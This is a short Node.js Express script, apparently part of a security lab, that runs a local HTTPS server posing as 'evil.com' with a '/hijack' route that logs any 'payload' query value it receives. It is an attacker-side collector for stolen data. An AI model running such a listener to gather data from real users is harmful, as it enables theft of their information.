const localHost = require("https-localhost");
const express = require("express");
const app = localHost("evil.com");

app.use(express.static(__dirname + "/static"));

app.route('/hijack').get(((req, res) => {
    console.log(req.query.payload);
    res.send('ok');
}))

app.listen(666);
